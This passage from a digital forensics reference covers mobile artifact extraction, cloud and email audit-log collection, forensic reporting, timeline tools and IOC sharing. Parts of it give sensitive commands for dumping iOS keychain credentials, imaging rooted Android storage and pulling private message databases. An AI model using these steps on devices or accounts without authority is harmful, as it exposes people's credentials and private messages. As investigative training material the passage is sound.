| WhatsApp | `AppDomainGroup-group.net.whatsapp.WhatsApp.shared/ChatStorage.sqlite` | Messages, media |
| Health | `HealthDomain/Health/healthdb_secure.sqlite` | Steps, heart rate, sleep |
| Notes | `HomeDomain/Library/Notes/` | Apple Notes content |
| Keychain | `KeychainDomain/keychain-backup.plist` | Credentials (encrypted) |

**Parse sms.db:**
```bash
sqlite3 sms.db "SELECT datetime(date/1000000000 + 978307200, 'unixepoch', 'localtime') as time, is_from_me, text FROM message ORDER BY date DESC LIMIT 50;"
```

#### iOS Keychain Extraction
```bash
# Requires jailbroken device or advanced acquisition
./keychain-dumper -a > keychain.txt

# From encrypted backup (requires backup password)
python3 -c "
from iphone_backup_decrypt import EncryptedBackup
backup = EncryptedBackup('/path/to/backup', 'password')
keychain = backup.get_keychain()
print(keychain)
"
```

---

### Android Forensics

#### Acquisition Methods

| Method | Data Access | Requirements |
|--------|------------|-------------|
| ADB backup | Limited logical | USB debugging enabled |
| ADB pull | App-specific (root req. for /data) | Root or exploit |
| EDL (Emergency Download) Mode | Physical NAND | Qualcomm devices; loader required |
| fastboot | Partition images | Unlocked bootloader |
| Chip-off | Raw NAND | Destructive; lab required |
| JTAG | Raw memory | Hardware access; non-destructive |

#### ADB Logical Acquisition
```bash
# Enable USB debugging: Settings > Developer Options > USB Debugging
adb devices  # Confirm device connected

# Backup (limited -- apps must opt-in)
adb backup -all -shared -f backup.ab
# Convert to tar:
dd if=backup.ab bs=24 skip=1 | python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" | tar x

# Pull specific paths (may require root)
adb pull /sdcard/ sdcard_data/
adb pull /data/data/com.whatsapp/ whatsapp_data/

# Shell commands
adb shell
# > dumpsys package packages | grep "packageName"
# > pm list packages -f
# > getprop | grep "ro\.(build\|product)"

# Root acquisition via ADB
adb shell su -c "dd if=/dev/block/mmcblk0 of=/sdcard/full_image.img bs=4096"
adb pull /sdcard/full_image.img .
```

#### Key Android Artifacts

| Artifact | Location | Contents |
|---------|---------|---------|
| SMS | `/data/data/com.android.providers.telephony/databases/mmssms.db` | SMS/MMS messages |
| Call Log | `/data/data/com.android.providers.contacts/databases/calllog.db` | Call history |
| Contacts | `/data/data/com.android.providers.contacts/databases/contacts2.db` | Contact data |
| Browser | `/data/data/com.android.browser/databases/browser2.db` | History, bookmarks |
| WhatsApp | `/data/data/com.whatsapp/databases/msgstore.db` | Messages, media refs |
| Telegram | `/data/data/org.telegram.messenger/files/` | Encrypted DB |
| Gmail | `/data/data/com.google.android.gm/databases/mailstore.*.db` | Email cache |
| Google Maps | `/data/data/com.google.android.apps.maps/databases/gmm_myplaces.db` | Location history |
| Photos | `/sdcard/DCIM/` and `/sdcard/Pictures/` | Photos with EXIF |
| App Data | `/data/data/<package_name>/` | All app sandboxed storage |

**Parse mmssms.db:**
```bash
sqlite3 mmssms.db "SELECT datetime(date/1000,'unixepoch','localtime'), address, body, type FROM sms ORDER BY date DESC LIMIT 50;"
# type: 1=Received, 2=Sent
```

---

### Commercial Mobile Forensics Tools

#### Cellebrite UFED (Universal Forensic Extraction Device)
- Industry-standard hardware/software platform
- Supports 30,000+ device profiles
- Physical, logical, and filesystem acquisition
- UFED Physical Analyzer for examination
- Generates court-ready reports
- UFEDReader for free report viewing (no license required)

**UFED Cloud Analyzer:** Extracts data from cloud services (Google, Apple iCloud, Samsung, social media) using credentials or tokens extracted from device.

#### Magnet AXIOM
- Unified platform: computer, mobile, cloud, and vehicle forensics
- Artifact categories with automated timeline correlation
- Connections feature: automatically links artifacts (e.g., file download -> browser visit -> email attachment)
- AXIOM Process (acquisition) -> AXIOM Examine (analysis)
- Supported sources: iOS, Android, Windows, macOS, cloud accounts

#### Oxygen Forensics Detective
- Wide device support including drones, wearables, IoT
- Cloud extraction via tokens from device
- Social media extraction (Facebook, Instagram, Twitter DMs)
- SQLite Viewer with built-in decoder for iOS/Android databases

---

### MDM Forensics Considerations

Mobile Device Management (MDM) platforms present forensic opportunities and challenges:

**MDM Evidence Sources:**
- Device inventory (installed apps, OS version, serial number)
- Compliance status history (was encryption enabled? passcode set?)
- Remote wipe commands issued (and timestamp if executed)
- Location tracking history (if enrolled policy enabled)
- App installation/removal logs
- VPN connection logs

**Common MDM Platforms:**
- Microsoft Intune: Azure portal > Devices > Device history
- Jamf Pro (Apple): Jamf console > Inventory > Computer/Mobile history
- VMware Workspace ONE: UEM console > Device logs

**If device was remotely wiped:** MDM logs prove the wipe command was issued, by whom, and when — potentially relevant to destruction of evidence analysis.

---
## 9. Cloud & Email Forensics

### Microsoft 365 Forensics

#### Unified Audit Log (UAL)
The UAL records user and admin activity across Microsoft 365 services. Key details:
- **Retention:** 90 days (standard), 1 year (E3/E5 with audit log retention policy), up to 10 years (with Advanced Audit add-on)
- **Requires:** Audit logging enabled (verify with `Get-AdminAuditLogConfig | FL UnifiedAuditLogIngestionEnabled`)

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline -UserPrincipalName admin@tenant.onmicrosoft.com

# Search audit log (max 5000 results per call)
$results = Search-UnifiedAuditLog -StartDate "2024-01-01" -EndDate "2024-01-31" `
    -UserIds "suspect@company.com" -ResultSize 5000

# Export to CSV
$results | Select-Object CreationDate, UserIds, Operations, AuditData | Export-Csv -Path audit_log.csv -NoTypeInformation

# Filter for email access
$results = Search-UnifiedAuditLog -StartDate "2024-01-01" -EndDate "2024-01-31" `
    -Operations MailItemsAccessed, Send, MoveToDeletedItems, HardDelete, SoftDelete `
    -UserIds "suspect@company.com" -ResultSize 5000

# Parse AuditData JSON
$results | ForEach-Object {
    $data = $_.AuditData | ConvertFrom-Json
    [PSCustomObject]@{
        Time = $_.CreationDate
        User = $_.UserIds
        Operation = $_.Operations
        ClientIP = $data.ClientIPAddress
        Item = $data.Item.Subject
        Folder = $data.Folder.Path
    }
} | Export-Csv email_access.csv
```

**Critical Audit Operations for IR:**

| Operation | Service | Meaning |
|-----------|---------|---------|
| `MailItemsAccessed` | Exchange | Email read (requires E5 or Advanced Audit) |
| `Send` | Exchange | Email sent |
| `MoveToDeletedItems` | Exchange | Email deleted to trash |
| `HardDelete` | Exchange | Email permanently deleted |
| `FileDownloaded` | SharePoint/OneDrive | File downloaded |
| `FileUploaded` | SharePoint | File uploaded |
| `AnonymousLinkCreated` | SharePoint | External sharing link created |
| `UserLoggedIn` | Azure AD/Entra | Successful login |
| `UserLoginFailed` | Azure AD/Entra | Failed login |
| `Add member to role` | Azure AD | Privilege escalation |
| `Add app role assignment to service principal` | Azure AD | OAuth app consent |

#### Hawk PowerShell Tool (M365 IR)
```powershell
# Install Hawk
Install-Module Hawk -Force -AllowClobber

# Initialize investigation
Start-HawkTenantInvestigation
Start-HawkUserInvestigation -UserPrincipalName suspect@company.com

# Individual functions
Get-HawkUserEmailForwarding -UserPrincipalName suspect@company.com
Get-HawkUserInboxRule -UserPrincipalName suspect@company.com
Get-HawkUserAuthHistory -UserPrincipalName suspect@company.com
Get-HawkTenantAdminInformation
Get-HawkTenantEDiscoveryLog
```

#### Exchange Online Message Trace
```powershell
# Trace email delivery (10-day window)
Get-MessageTrace -SenderAddress "suspect@company.com" -StartDate "2024-01-01" -EndDate "2024-01-10" |
    Select-Object Received, SenderAddress, RecipientAddress, Subject, Status, MessageId |
    Export-Csv message_trace.csv

# Check inbox rules (auto-forward rules)
Get-InboxRule -Mailbox "suspect@company.com" | Select-Object Name, Enabled, ForwardTo, RedirectTo, DeleteMessage | Format-List
```

#### Microsoft 365 eDiscovery
1. **Content Search:** Compliance portal > Content Search > New Search
   - Keywords, date ranges, locations (mailboxes, SharePoint, Teams)
   - Export results or preview
2. **Core eDiscovery:** Case management with legal holds and exports
3. **Advanced eDiscovery:** AI-powered relevance scoring, custodian management, native redactions

```powershell
# PowerShell eDiscovery
New-ComplianceSearch -Name "IR_Investigation" -ContentMatchQuery "keyword1 OR keyword2" `
    -ExchangeLocation "suspect@company.com" -AllowNotFoundExchangeLocationsEnabled $true
Start-ComplianceSearch -Identity "IR_Investigation"
Get-ComplianceSearch -Identity "IR_Investigation"

# Export results
New-ComplianceSearchAction -SearchName "IR_Investigation" -Export -ExchangeArchiveFormat SinglePst
```

---

### Google Workspace Forensics

#### Admin Console Audit Logs
Available at: admin.google.com > Reports > Audit

- **Admin audit:** Changes to Google Workspace settings
- **Login audit:** User sign-ins, 2FA events, suspicious logins
- **Drive audit:** File sharing, downloads, external sharing
- **Gmail audit:** Send, receive, delete events
- **Meet audit:** Conference creation, participant joins

#### Gmail Log Search and Google Vault
```
# Google Vault (vault.google.com) for legal hold and eDiscovery
# Create matter > hold > search:
# - Mail: date range, sender, recipient, keywords
# - Drive: date range, owner, keywords
# - Export: MBOX (email), JSON (Drive metadata), PST

# Gmail Log Search (Admin console > Reports > Email Log Search)
# Search by:
# - Sender/recipient email
# - Subject
# - Message ID
# - Date range
# Shows: delivery status, IP addresses, routing path
```

#### BigQuery Log Export
```sql
-- Query exported audit logs in BigQuery
SELECT
  timestamp,
  protopayload_auditlog.authenticationInfo.principalEmail,
  protopayload_auditlog.methodName,
  protopayload_auditlog.resourceName,
  protopayload_auditlog.requestMetadata.callerIp
FROM `project_id.dataset_id.cloudaudit_googleapis_com_activity_*`
WHERE timestamp BETWEEN '2024-01-01' AND '2024-01-31'
  AND protopayload_auditlog.authenticationInfo.principalEmail = 'suspect@company.com'
ORDER BY timestamp DESC
LIMIT 1000;
```

---

### AWS CloudTrail Forensics

CloudTrail records API calls across AWS services.

**Log Locations:**
- S3 bucket configured at CloudTrail creation (typically `s3://company-cloudtrail-logs/AWSLogs/`)
- Log format: JSON, gzipped, one file per 5-minute period per region

```bash
# Download and decompress logs
aws s3 sync s3://company-cloudtrail-logs/AWSLogs/123456789/CloudTrail/us-east-1/2024/01/ cloudtrail_logs/
gunzip cloudtrail_logs/**/*.json.gz

# Search with jq
cat cloudtrail_logs/*.json | python3 -c "
import json, sys
for line in sys.stdin:
    data = json.loads(line)
    for event in data.get('Records', []):
        if event.get('userIdentity', {}).get('userName') == 'suspect_user':
            print(json.dumps(event, indent=2))
" | head -200

# Key fields to examine
jq '.Records[] | select(.userIdentity.userName == \"suspect_user\") | {time: .eventTime, event: .eventName, source: .eventSource, ip: .sourceIPAddress, region: .awsRegion, resource: .requestParameters}' cloudtrail_logs/*.json
```

**Querying CloudTrail with Athena:**
```sql
-- Find IAM changes
SELECT * FROM cloudtrail_logs
WHERE eventsource = 'iam.amazonaws.com'
  AND eventname IN ('CreateUser','AttachUserPolicy','CreateAccessKey','AddUserToGroup')
  AND eventtime >= '2024-01-01';

-- S3 data access events (requires S3 data events enabled in CloudTrail)
SELECT eventtime, eventname, requestparameters, sourceipaddress
FROM cloudtrail_logs
WHERE eventsource = 's3.amazonaws.com'
  AND eventname IN ('GetObject','PutObject','DeleteObject')
  AND json_extract_scalar(requestparameters, '$.bucketName') = 'sensitive-bucket';
```

---

### Azure Activity Log and Entra ID

```powershell
# Connect to Azure
Connect-AzAccount
Connect-AzureAD

# Query Azure Activity Log (subscription-level events)
Get-AzLog -StartTime "2024-01-01" -EndTime "2024-01-31" -Status Failed |
    Select-Object EventTimestamp, Caller, OperationName, Status | Export-Csv azure_activity.csv

# Entra ID (Azure AD) Sign-in Logs via Microsoft Graph API
$headers = @{Authorization = "Bearer $token"}
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/auditLogs/signIns?`$filter=userPrincipalName eq 'suspect@company.com'&`$top=100" `
    -Headers $headers | ConvertTo-Json -Depth 10 | Out-File signin_logs.json

# Via AzureAD module
Get-AzureADAuditSignInLogs -Filter "userPrincipalName eq 'suspect@company.com'" |
    Select-Object CreatedDateTime, UserDisplayName, IpAddress, Location, Status | Format-Table
```

---

### Slack and Microsoft Teams Forensics

#### Slack
```bash
# Slack eDiscovery API (requires Business+ or Enterprise Grid)
# Export via Admin: workspace_name.slack.com/admin/workspace-settings > Import/Export Data

# Slack Discovery API (Enterprise Grid)
curl -H "Authorization: Bearer xoxp-token" \
  "https://slack.com/api/discovery.enterprise.info"

# Query message history with API
curl -H "Authorization: Bearer xoxp-token" \
  "https://slack.com/api/conversations.history?channel=C012AB3CD&oldest=1609459200&latest=1612137600&limit=200"
```

#### Microsoft Teams
```powershell
# Teams messages stored in Exchange Online (user mailboxes + group mailboxes)
# Access via eDiscovery Content Search -- include Teams chats location

# Teams audit log events
Search-UnifiedAuditLog -Operations "MessageCreatedHasLink,MessageDeleted,MeetingCreated" `
    -StartDate "2024-01-01" -EndDate "2024-01-31" -ResultSize 5000
```

---

### SaaS Application Forensics

**General Approach:**
1. Identify all SaaS applications used (check Azure AD Enterprise Applications, SSO configs)
2. Determine log retention periods per application
3. Issue legal hold or log export requests before retention expires
4. Request logs via admin console, API, or legal process to vendor

**Common SaaS Log Sources:**

| Platform | Log Access Method |
|----------|------------------|
| Salesforce | Setup > Event Log Files (API or UI download) |
| GitHub | Organization > Audit Log (90-day retention, API available) |
| Okta | System Log (180-day retention, API available) |
| Box | Admin Console > Reports > Enterprise Events |
| Dropbox | Admin console > Activity log or API |
| Zoom | Account Management > Reports > Activity Reports |

---
## 10. Forensic Reporting & Tools Reference

### Forensic Report Structure

A forensic report must be clear, defensible, reproducible, and accessible to non-technical audiences. Standard structure:

#### 1. Executive Summary
- Case overview in non-technical language (1-2 pages)
- Key findings in plain English
- Conclusions and their significance
- Limitations of the investigation
- Recommendations

#### 2. Case Information
- Case number, date, investigating examiner(s)
- Legal authority (warrant number, consent form reference, corporate policy)
- Scope and objectives of the examination
- Evidence received (itemized list with descriptions and hashes)

#### 3. Examiner Qualifications
- Education, training, certifications
- Experience in relevant areas (number of cases, years)
- Publications or training courses taught
- Expert witness testimony history (courts, frequency)

#### 4. Methodology
- Tools used (name, version, configuration)
- Procedures followed (reference to SWGDE guidelines, NIST SP 800-86)
- Verification steps (hash checks, peer review)
- Any departures from standard methodology and justification

#### 5. Evidence Inventory
| Item | Description | Serial/Hash | Received Date | Condition |
|------|-------------|-------------|---------------|-----------|
| E-01 | Seagate 1TB HDD | SHA256: abc123... | 2024-01-15 | Seized powered off |

#### 6. Findings
- Organized by theme or chronologically
- Each finding: description, supporting artifacts, relevant timestamps
- Screenshots and exhibits with figure numbers
- Timestamps in consistent format (UTC recommended)

#### 7. Timeline
- Chronological reconstruction of events
- Correlate artifacts from multiple sources
- Note gaps or uncertainty

#### 8. Conclusions
- Answer the questions posed in scope
- Distinguish between what the evidence proves vs. what it suggests
- Note alternative explanations considered and why discounted
- State confidence level for each conclusion

#### 9. Appendices
- Raw tool output
- Complete file listings
- Full evidence chain of custody log
- Glossary of technical terms

---

### Timeline Creation with log2timeline / Plaso

**Plaso** is the Python processing engine for log2timeline, converting artifacts into a unified timeline.

**Installation:**
```bash
pip3 install plaso
# Or use Docker
docker pull log2timeline/plaso
docker run -v /evidence:/evidence log2timeline/plaso log2timeline.py /evidence/output.plaso /evidence/image.dd
```

**Phase 1 — Processing (log2timeline):**
```bash
# Process a disk image
log2timeline.py --parsers all output.plaso evidence.dd

# Process specific artifact types
log2timeline.py --parsers win_evt,win_prefetch,winevtx,chrome_history output.plaso evidence.dd

# Process a directory
log2timeline.py output.plaso /mnt/evidence/

# Process with timezone
log2timeline.py --timezone UTC output.plaso evidence.dd

# Process Windows artifacts specifically
log2timeline.py --parsers win_evt,win_prefetch,winevtx,winreg,chrome_history,firefox_history output.plaso /evidence/
```

**Phase 2 — Filtering and Output (psort):**
```bash
# Filter by date range and output to CSV
psort.py -o l2tcsv -w timeline.csv output.plaso "date > '2024-01-01 00:00:00' AND date < '2024-01-31 23:59:59'"

# Filter by keyword
psort.py -o l2tcsv -w malware_timeline.csv output.plaso "message CONTAINS 'malware.exe'"

# Filter by source
psort.py --slice "2024-01-15 12:00:00" --slice_size 120 -o l2tcsv -w slice.csv output.plaso

# Output formats
psort.py -o json -w output.json output.plaso
psort.py -o xlsx -w timeline.xlsx output.plaso
```

**Timeline Explorer (Eric Zimmerman -- Windows GUI):**
```cmd
TimelineExplorer.exe timeline.csv
:: Features: filter, search, highlight, group by source type
:: Sort by date to view chronological activity
```

---

### Chain of Custody Documentation

**Essential Fields:**
```
CHAIN OF CUSTODY FORM
Case Number: ___________________
Item Number: ___________________
Description: ___________________
Make/Model/Serial: ______________
Capacity: ______________________
Hash (MD5): ____________________
Hash (SHA-256): ________________

DATE       TIME   FROM                TO                   PURPOSE           SEAL
2024-01-15 09:00  Scene (Det. Smith)  Evidence Room (ER23) Storage           T-001
2024-01-16 14:00  Evidence Room       Forensic Lab (J.Doe) Imaging           T-002
2024-01-16 18:00  Forensic Lab        Evidence Room        Storage           T-003

Verified intact: Yes / No
Signature: _________________________
```

**Digital CoC -- Hash-Based Verification:**
```bash
# At each transfer point, generate and record hashes
sha256sum evidence.dd > evidence.dd.sha256
md5sum evidence.dd >> evidence.dd.sha256

# Recipient verifies
sha256sum -c evidence.dd.sha256
```

---

### Court-Ready Exhibit Preparation

1. **Label exhibits** with case number, exhibit number, item description, and examiner initials
2. **Authenticate evidence:** Verify hash matches original; include hash in exhibit notes
3. **Screenshots:** Include timestamp (UTC), tool name and version, case reference
4. **Metadata:** Export metadata alongside content; document timezone conversions
5. **Redaction:** Ensure PII not relevant to case is redacted (use Adobe Acrobat or Relativity)
6. **Bates numbering:** Sequential page numbering across all exhibits for cross-reference

---

### Eric Zimmerman Tools Reference Card

Eric Zimmerman's free forensic tools are the gold standard for Windows artifact parsing.
Download: https://ericzimmerman.github.io/#!index.md

| Tool | Purpose | Key Output |
|------|---------|-----------|
| **MFTECmd** | Parse $MFT, $UsnJrnl, $Boot, $J | File metadata, timeline |
| **LECmd** | Parse LNK shortcut files | Target paths, timestamps, volume info |
| **JLECmd** | Parse Jump Lists | Recently/frequently used files per app |
| **PECmd** | Parse Prefetch files | Execution history, accessed files |
| **RECmd** | Registry Command-line parser | Key/value extraction with batch maps |
| **AppCompatCacheParser** | Parse ShimCache/AppCompatCache | Execution history from SYSTEM hive |
| **AmcacheParser** | Parse Amcache.hve | SHA1, execution history, publisher |
| **SrumECmd** | Parse SRUM database | Network usage, app resource usage |
| **WxTCmd** | Parse Windows Timeline | App usage, file opens |
| **EvtxECmd** | Parse EVTX event logs | All event fields, timeline integration |
| **SQLECmd** | Parse SQLite databases | Browser history, Jumplist DBs |
| **RBCmd** | Parse Recycle Bin $I files | Original path, size, deletion time |
| **SBECmd** | Parse Shellbag artifacts | Folder browsing history |
| **TimelineExplorer** | View/filter CSV timelines | Unified timeline analysis |
| **Registry Explorer** | GUI registry hive viewer | Browse offline hives |
| **ShellBags Explorer** | GUI shellbag viewer | Visual folder tree |

**Batch processing example:**
```cmd
:: Process all prefetch files
PECmd.exe -d "C:\Windows\Prefetch" --csv C:\Output\ -q

:: Process all EVTX files with Maps
EvtxECmd.exe -d "C:\Windows\System32\winevt\Logs" --csv C:\Output\ --csvf all_events.csv --maps "C:\EZTools\Maps"

:: Process MFT
MFTECmd.exe -f "\\.\C:" --csv C:\Output\

:: Registry parsing with batch map
RECmd.exe -d "C:\Windows\System32\config" --bn "C:\EZTools\RECmd\BatchExamples\Kroll_Batch.reb" --csv C:\Output\
```

---

### SIFT Workstation Tool Reference

Ubuntu-based forensic workstation from SANS DFIR:

| Category | Tools |
|----------|-------|
| **Disk Imaging** | Guymager, dc3dd, dcfldd, ddrescue |
| **File System** | The Sleuth Kit, Autopsy, TestDisk, PhotoRec |
| **Memory** | Volatility 3, LiME, MemProcFS |
| **Timeline** | log2timeline/Plaso, Timeline Explorer |
| **Registry** | RegRipper, Registry Explorer |
| **Network** | Wireshark, NetworkMiner, Zeek, tcpflow |
| **Mobile** | libimobiledevice, adb |
| **macOS** | mac_apt |
| **VSS** | libvshadow (vshadowmount) |
| **E01/EWF** | libewf (ewfmount, ewfinfo, ewfverify) |
| **AFF** | afflib (affcat, affinfo) |
| **Hashing** | md5deep, sha1deep, hashdeep |
| **Search/Carving** | Scalpel, bulk_extractor, foremost |
| **Hex Analysis** | wxHexEditor, xxd, hexedit |
| **PDF Analysis** | PDFid, pdf-parser |
| **Office Docs** | oletools (olevba, oleid, mraptor) |

---

### IOC Extraction and Sharing Post-Investigation

**Extract IOCs from investigation artifacts:**
```bash
# Bulk extractor: extract IPs, emails, URLs, MAC addresses from binary data
bulk_extractor -o bulk_output/ evidence.dd

# From Zeek logs
zeek-cut id.resp_h < conn.log | sort -u > external_ips.txt
zeek-cut query < dns.log | sort -u > dns_queries.txt
zeek-cut host < http.log | sort -u > http_hosts.txt
zeek-cut sha256 < files.log | grep -v "^-$" > file_hashes.txt
```

**STIX/TAXII IOC Sharing:**
```python
from stix2 import Indicator, Bundle, Malware, Relationship

# Create STIX indicator
indicator = Indicator(
    name="Cobalt Strike Beacon Domain",
    pattern="[domain-name:value = 'c2.malicious.com']",
    pattern_type="stix",
    valid_from="2024-01-01T00:00:00Z",
    labels=["malicious-activity"]
)
bundle = Bundle(objects=[indicator])
print(bundle.serialize(pretty=True))
```

**MISP (Malware Information Sharing Platform):**
```bash
pip install pymisp
python3 -c "
from pymisp import PyMISP
misp = PyMISP('https://misp.company.com', 'api_key')
event = misp.new_event(info='IR Investigation 2024-001', distribution=1, threat_level_id=1, analysis=2)
misp.add_named_attribute(event, 'ip-dst', '1.2.3.4')
misp.add_named_attribute(event, 'domain', 'c2.malicious.com')
misp.add_named_attribute(event, 'md5', 'abc123...')
"
```

---

### Case Management Tools

#### DFIR IRIS
Open-source DFIR case management platform:
```bash
# Docker deployment
git clone https://github.com/dfir-iris/iris-web
cd iris-web
docker-compose up -d
# Access at https://localhost
```

Features: Case timelines, evidence tracking, IOC management, note-taking, task assignment, report generation.

#### TheHive
Security incident response platform with Cortex integration for automated enrichment:
```bash
# Docker deployment
docker-compose up -d thehive cortex elasticsearch

# Create alert via API
curl -XPOST -H 'Content-Type: application/json' http://localhost:9000/api/alert \
  -d '{"title":"Suspicious Activity","description":"Beaconing detected","severity":2,"tlp":2,"type":"external","source":"Zeek","artifacts":[{"dataType":"ip","data":"1.2.3.4"}]}'
```

---

### Professional Certifications Reference

| Certification | Issuing Body | Focus Area |
|--------------|-------------|-----------|
| **GCFE** (GIAC Certified Forensic Examiner) | GIAC/SANS | Windows forensics, evidence handling |
| **GCFA** (GIAC Certified Forensic Analyst) | GIAC/SANS | Advanced forensics, memory, IR |
| **GNFA** (GIAC Network Forensic Analyst) | GIAC/SANS | Network forensics, PCAP analysis |
| **GASF** (GIAC Advanced Smartphone Forensics) | GIAC/SANS | Mobile device forensics |
| **EnCE** (EnCase Certified Examiner) | OpenText | EnCase platform expertise |
| **CHFI** (Computer Hacking Forensic Investigator) | EC-Council | Broad forensics methodology |
| **CCE** (Certified Computer Examiner) | ISFCE | Vendor-neutral forensics |
| **ACE** (AccessData Certified Examiner) | Exterro | FTK platform expertise |
| **CFCE** (Certified Forensic Computer Examiner) | IACIS | Law enforcement focused |
| **CISA** (Certified Information Systems Auditor) | ISACA | Audit and investigation |

---

### Quick Reference: Timestamps and Formats

| Format | Example | Used In |
|--------|---------|--------|
| Unix Epoch (seconds) | 1704067200 | Linux logs, Zeek, many APIs |
| Unix Epoch (milliseconds) | 1704067200000 | Android (SMS, CallLog) |
| Windows FILETIME (100ns intervals since 1601-01-01) | 133484928000000000 | $MFT, Registry, LNK files |
| Chrome/WebKit Timestamp (microseconds since 1601-01-01) | 13339520000000000 | Chrome History, Safari |
| Mac Absolute Time (seconds since 2001-01-01) | 725846400 | iOS backups, macOS CoreData |
| ISO 8601 | 2024-01-01T00:00:00Z | Modern APIs, logs |

**Conversion examples:**
```python
import datetime

# Unix epoch to datetime
datetime.datetime.utcfromtimestamp(1704067200)
# => datetime.datetime(2024, 1, 1, 0, 0)

# Windows FILETIME to datetime
def filetime_to_dt(ft):
    return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=ft // 10)
filetime_to_dt(133484928000000000)

# Chrome timestamp to datetime
def chrome_to_dt(t):
    return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=t)

# Mac Absolute Time to datetime
def mac_abs_to_dt(t):
    return datetime.datetime(2001, 1, 1) + datetime.timedelta(seconds=t)
```

---

*This reference library is maintained for professional use in lawful digital forensics investigations. All techniques should be applied within the bounds of applicable law, proper legal authority, and ethical guidelines. Last updated: 2026.*
